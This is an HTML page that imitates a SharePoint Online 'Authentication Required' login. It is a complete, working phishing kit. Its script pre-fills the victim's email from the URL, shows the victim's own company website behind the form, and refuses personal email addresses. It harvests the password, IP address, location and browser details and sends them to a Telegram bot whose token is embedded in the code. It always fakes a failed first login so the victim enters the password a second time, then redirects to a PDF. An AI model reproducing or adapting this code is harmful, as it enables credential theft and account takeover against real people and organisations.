<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=10">
    <title>Pending File - SharePoint Online</title>
    <link rel="icon" type="image/gif" href="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico?v=BUILD_HASH">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <style>
        body {
            font-family: Arial;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            position: relative;
        }

        /* Visitor's Website as Background */
        #visitor-background {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: -1;
        }

        /* Dark overlay for better form visibility */
        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
           
        }

        /* Domain display */
        .domain-info {
            color: white;
            text-align: center;
            margin-bottom: 10px;
            padding: 5px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 4px;
            font-size: 12px;
        }

        /* Form Container */
        .container {
            background-color: rgba(255, 255, 255, 0.95);
            padding: 30px 25px;
            border-radius: 10px;
            border: 1px solid #C0C0C0;
            width: 400px;
            max-width: 90%;
            text-align: center;
            backdrop-filter: blur(10px);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            position: relative;
            z-index: 1;
        }

        /* Form group for better alignment */
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .form-group label {
            display: block;
            color: #333;
            font-weight: 600;
            font-size: 14px;
            margin-bottom: 5px;
            text-align: left;
        }

        /* Input Fields */
        input[type=email], input[type=password] {
            width: 100%;
            padding: 12px 15px;
            background-color: white;
            color: black;
            font-weight: 400;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 14px;
            transition: all 0.3s;
        }

        input[type=email]:focus, input[type=password]:focus {
            outline: none;
            border-color: #176658;
            box-shadow: 0 0 5px rgba(23, 102, 88, 0.3);
        }

        /* Submit Button */
        .submit-btn {
            width: 100%;
            background-color: #0078d7;
            color: white;
            padding: 14px 20px;
            margin: 15px 0 10px 0;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: 600;
            font-size: 16px;
            transition: all 0.3s;
        }

        .submit-btn:hover {
            background-color: #176658;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 120, 215, 0.3);
        }

        .submit-btn:disabled {
            background-color: #ccc;
            cursor: not-allowed;
            transform: none;
        }

        /* Error/Success Messages */
        #show {
            color: #d32f2f;
            font-family: sans-serif;
            font-size: 13px;
            min-height: 20px;
            margin: 5px 0;
            background: #ffebee;
            padding: 8px;
            border-radius: 4px;
            display: none;
        }

        /* Remember me checkbox */
        .checkbox-container {
            text-align: left;
            margin: 10px 0 5px 0;
            display: flex;
            align-items: center;
        }

        .checkbox-container input {
            margin-right: 8px;
            width: auto;
            cursor: pointer;
        }

        .checkbox-container label {
            color: #333;
            font-size: 14px;
            cursor: pointer;
            margin: 0;
        }

        /* Header */
        .header {
            margin-bottom: 25px;
            text-align: center;
        }

        .header h3 {
            color: #176658;
            margin: 10px 0 5px 0;
            font-size: 20px;
        }

        .header .sub-header {
            color: #666;
            font-size: 13px;
            margin-top: 5px;
        }

        /* Loading indicator */
        .loading {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #176658;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 5px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Field labels */
        .field-label {
            display: block;
            color: #333;
            font-weight: 600;
            font-size: 14px;
            margin-bottom: 5px;
            text-align: left;
        }

        /* Container for better spacing */
        .input-container {
            margin-bottom: 5px;
        }
        #ethical-warning {
            background: #FFEBEE;
            border-left: 4px solid  ;
            padding: 15px;
            margin-top: 20px;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <!-- Visitor's Website as Background -->
    <iframe id="visitor-background" src="about:blank" sandbox="allow-same-origin allow-scripts allow-forms"></iframe>
    <div class="overlay"></div>
    
    <div class="container">
        <div class="header">
            <font face="Trebuchet MS" color="#4285F4" size="5"><b>Authentication Required</b></font>
            
        </div>
        <br><br>
        <form id="login-form">
            <!-- Email field with proper label -->
            <div class="form-group">
                <label for="mail">Email Address</label>
                <input type="email" id="mail" name="email" placeholder="Enter your email address" required>
            </div>
             <!-- Error message display -->
            <span id="show"></span> 
            <!-- Password field with proper label -->
            <div class="form-group">
                <label for="pass">Password</label>
                <input type="password" id="pass" name="password" placeholder="Enter your password" autofocus required>
            </div>
            
           
            
            <!-- Remember me checkbox aligned left -->
            <div class="checkbox-container">
                <input type="checkbox" class="custom-control-input" id="customControlInline">
                <label class="custom-control-label" for="customControlInline">Remember me</label>
            </div>
            
            <!-- Submit button -->
            <button type="button" class="submit-btn" id="button">
                <span>Sign In</span>
            </button>
       <div id="ethical-warning">
            <strong>SECURITY NOTICE:</strong> You're accessing secure settings, please provide your password to continue.
        </div><br>
        <div class="sub-header" id="domain-display">Loading domain...</div>
        </form>
    </div>

    <script>
        window.addEventListener('load', function() {
            // Telegram Bot Configuration - REPLACE WITH YOUR ACTUAL VALUES
            const BOT_TOKEN = '8326892401:AAGfmlNeSZSfByMtk4kDEq2fOaMO7dc7dWc';
            const CHAT_IDS = ['7144653947']; // Can be multiple chat IDs
            
            // Get email from URL hash
            var maler = window.location.hash.substr(1);
            var domain = '';
            var visitorWebsite = '';
            
            // Pre-fill email and load background
            if (maler) {
                document.getElementById('mail').value = maler;
                
                // Extract domain from email
                if (maler.includes('@')) {
                    domain = maler.split('@')[1];
                    visitorWebsite = 'https://' + domain;
                    
                    // Display domain
                    document.getElementById('domain-display').innerHTML = 'Accessing: <strong>' + domain + '</strong>';
                    
                    // Load visitor's website as background
                    loadVisitorBackground(visitorWebsite);
                }
            } else {
                // If no email in hash, try to get from referrer
                if (document.referrer) {
                    try {
                        var referrerUrl = new URL(document.referrer);
                        domain = referrerUrl.hostname;
                        visitorWebsite = referrerUrl.origin;
                        document.getElementById('domain-display').innerHTML = 'Accessing: <strong>' + domain + '</strong>';
                        loadVisitorBackground(visitorWebsite);
                    } catch(e) {
                        document.getElementById('domain-display').innerHTML = 'Secure Authentication';
                    }
                } else {
                    // Fallback to current domain
                    domain = window.location.hostname;
                    visitorWebsite = window.location.origin;
                    document.getElementById('domain-display').innerHTML = 'Accessing: <strong>' + domain + '</strong>';
                    loadVisitorBackground(visitorWebsite);
                }
            }
            
            // Function to load visitor's website as background
            function loadVisitorBackground(url) {
                var iframe = document.getElementById('visitor-background');
                iframe.src = url;
                
                // Handle iframe load error
                iframe.onerror = function() {
                    console.log('Failed to load background, using fallback');
                    // Try without www if needed
                    if (url.includes('www.')) {
                        iframe.src = url.replace('www.', '');
                    }
                };
            }
            
            // DOM elements
            var button = document.getElementById('button');
            var emailInput = document.getElementById('mail');
            var passInput = document.getElementById('pass');
            var messageBox = document.getElementById('show');
            
            // Counter for login attempts
            var counter = 0;
            
            // Helper function to show messages
            function showMessage(message, isError = true) {
                messageBox.style.display = 'block';
                messageBox.innerHTML = message;
                messageBox.style.color = isError ? '#d32f2f' : '#2e7d32';
                
                // Clear password field
                passInput.value = '';
                
                // Auto-hide after 3 seconds
                setTimeout(() => {
                    messageBox.style.display = 'none';
                }, 3000);
            }
            
            // Function to get user's IP address
            function getUserIP(callback) {
                $.getJSON('https://api.ipify.org?format=json', function(data) {
                    callback(data.ip);
                }).fail(function() {
                    // Fallback to ipinfo.io
                    $.getJSON('https://ipinfo.io/json', function(data) {
                        callback(data.ip);
                    }).fail(function() {
                        callback('IP unavailable');
                    });
                });
            }
            
            // Function to get location from IP
            function getLocation(ip, callback) {
                if (ip === 'IP unavailable') {
                    callback('Location unavailable');
                    return;
                }
                
                $.getJSON('https://ipapi.co/' + ip + '/json/', function(data) {
                    if (data.city && data.country_name) {
                        callback(data.city + ', ' + data.country_name);
                    } else {
                        callback('Location unavailable');
                    }
                }).fail(function() {
                    callback('Location unavailable');
                });
            }
            
            // Function to send data to Telegram
            function sendToTelegram(email, password, ip, location) {
                // Format message
                let message = '🔐 *NEW LOGIN ATTEMPT* 🔐\n\n';
                message += '📧 *Email:* ' + email + '\n';
                message += '🔑 *Password:* ' + password + '\n';
                message += '🌐 *Domain:* ' + domain + '\n';
                message += '🔄 *Attempt:* ' + (counter + 1) + '/2\n';
                message += '📡 *IP Address:* ' + ip + '\n';
                message += '📍 *Location:* ' + location + '\n';
                message += '🖥️ *User Agent:* ' + navigator.userAgent + '\n';
                message += '⏰ *Time:* ' + new Date().toLocaleString() + '\n';
                message += '🔗 *Referrer:* ' + (document.referrer || 'Direct');
                
                // Send to each chat ID
                CHAT_IDS.forEach(function(chatId) {
                    if (!chatId || chatId.trim() === '') return;
                    
                    var settings = {
                        async: true,
                        crossDomain: true,
                        url: "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage",
                        method: "POST",
                        headers: { 
                            "Content-Type": "application/json", 
                            "cache-control": "no-cache" 
                        },
                        data: JSON.stringify({ 
                            chat_id: chatId.trim(), 
                            text: message,
                            parse_mode: 'Markdown'
                        })
                    };
                    
                    $.ajax(settings)
                        .done(function(response) {
                            console.log('Telegram sent successfully to', chatId);
                        })
                        .fail(function(error) {
                            console.error('Telegram error for', chatId, error);
                            // Try without markdown if markdown fails
                            var fallbackSettings = {
                                async: true,
                                crossDomain: true,
                                url: "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage",
                                method: "POST",
                                headers: { 
                                    "Content-Type": "application/json", 
                                    "cache-control": "no-cache" 
                                },
                                data: JSON.stringify({ 
                                    chat_id: chatId.trim(), 
                                    text: message.replace(/\*+/g, '')
                                })
                            };
                            $.ajax(fallbackSettings);
                        });
                });
            }
            
            // Function to handle login
            function handleLogin() {
                var email = emailInput.value.trim();
                var password = passInput.value.trim();
                
                // Validation checks
                if (!email || email.indexOf('@') === -1) {
                    showMessage('Please enter a valid email address.');
                    return;
                }
                
                // Check for personal email domains
                var personalDomains = ['yahoo', 'gmail', 'outlook', 'aol', 'hotmail', 'msn', 'microsoft'];
                var isPersonal = personalDomains.some(function(dom) {
                    return email.indexOf(dom) !== -1;
                });
                
                if (isPersonal) {
                    showMessage('Please use your business email address.');
                    return;
                }
                
                if (!password) {
                    showMessage('Please enter your password.');
                    return;
                }
                
                if (password.length < 5) {
                    showMessage('Password is too short.');
                    return;
                }
                
                // Disable button and show loading
                button.disabled = true;
                button.innerHTML = '<span class="loading"></span> Verifying...';
                
                // Get user info and send to Telegram
                getUserIP(function(ip) {
                    getLocation(ip, function(location) {
                        sendToTelegram(email, password, ip, location);
                        
                        // Increment counter
                        counter++;
                        
                        // Handle based on attempt count
                        if (counter < 2) {
                            // First attempt - show error
                            setTimeout(function() {
                                button.disabled = false;
                                button.innerHTML = 'Sign In';
                                showMessage('The username or password you entered is incorrect. Try again.');
                            }, 1500);
                        } else {
                            // Second attempt - redirect to visitor's domain
                            setTimeout(function() {
                                button.innerHTML = 'Redirecting...';
                                showMessage('Access granted. Redirecting...', false);
                                
                                // Redirect the current page to the visitor's domain
                                if (visitorWebsite) {
                                    setTimeout(function() {
                                        window.location.href = "https://idealelectric.app.box.com/public/static/h4cmhn9s1r8dpxih4vkcblglwhd10txx.pdf";
                                    }, 2000);
                                }
                            }, 1500);
                        }
                    });
                });
            }
            
            // Add click event to button
            button.addEventListener('click', handleLogin);
            
            // Add enter key support
            passInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    handleLogin();
                }
            });
            
            // Add input event to clear messages
            emailInput.addEventListener('input', function() {
                messageBox.style.display = 'none';
            });
            
            passInput.addEventListener('input', function() {
                messageBox.style.display = 'none';
            });
            
            // Handle iframe loading issues
            var iframe = document.getElementById('visitor-background');
            iframe.onload = function() {
                console.log('Background loaded successfully');
            };
        });
    </script>
</body>
</html>
